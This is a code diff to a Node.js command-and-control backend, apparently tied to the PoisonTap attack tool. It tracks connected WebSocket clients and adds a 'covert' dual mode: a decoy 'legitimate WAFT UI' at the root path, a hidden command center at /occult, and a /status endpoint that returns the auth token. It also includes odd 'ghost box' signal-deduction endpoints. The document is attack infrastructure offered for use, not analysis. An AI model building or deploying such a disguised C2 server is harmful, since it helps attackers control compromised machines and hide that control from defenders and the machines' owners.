@@ -1,4 +1,4 @@
-// PoisonTap 2026 | Enhanced C2 Backend with Neo-Occult UI & Ghost Box
+// All-Seeing Eye | Dual-Mode Covert C2 Backend
 const http = require('http');
 const WebSocket = require('ws');
 const fs = require('fs');
@@ -22,7 +22,6 @@ wss.on('connection', (ws) => {
   const id = crypto.randomUUID();
   clients.set(id, { ws, conn: Date.now() });
   ws.isAlive = true;
-
   ws.on('pong', () => { ws.isAlive = true; });
   ws.on('message', (data) => {
     try {
@@ -45,14 +44,26 @@ setInterval(() => {
 const server = http.createServer(async (req, res) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
 
-  // Serve All-Seeing Eye Neo-Occult 4K UI
+  // DEFAULT: Legitimate WAFT UI
   if (url.pathname === '/' || url.pathname === '/index.html') {
+    try {
+      const html = await fsPromises.readFile(path.join(__dirname, 'waft_ui.html'), 'utf8');
+      res.writeHead(200, {'Content-Type': 'text/html'});
+      res.end(html);
+    } catch (e) {
+      res.writeHead(500); res.end('Legitimate UI missing.');
+    }
+    return;
+  }
+
+  // COVERT: Neo-Occult Command Center
+  if (url.pathname === '/occult') {
     try {
       const html = await fsPromises.readFile(path.join(__dirname, 'ui_4k_all_seeing_eye.html'), 'utf8');
       res.writeHead(200, {'Content-Type': 'text/html'});
       res.end(html);
     } catch (e) {
-      res.writeHead(500); res.end('UI missing. Download it.');
+      res.writeHead(500); res.end('True firmware not found.');
     }
     return;
   }
@@ -69,14 +80,12 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  // Ghost Box Stream
+  // Ghost Box & Deduction
   if (url.pathname === '/ghostbox') {
     res.writeHead(200, {'Content-Type': 'application/json'});
     res.end(JSON.stringify(ghostBox.getSignal()));
     return;
   }
-
-  // Signal Deduction
   if (url.pathname === '/deduce') {
     const signal = ghostBox.getSignal();
     const result = ghostBox.deduce(signal);
@@ -85,6 +94,7 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
+  // C2 API
   if(url.pathname === '/status'){
     res.writeHead(200, {'Content-Type':'application/json'});
     res.end(JSON.stringify({connected: clients.size, token: AUTH_TOKEN}));
@@ -103,5 +113,5 @@ const server = http.createServer(async (req, res) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`[+] Neo-Occult Backend active: http://0.0.0.0:${PORT}`);
+  console.log(`[+] Dual-Mode Backend active: http://0.0.0.0:${PORT}`);
 });
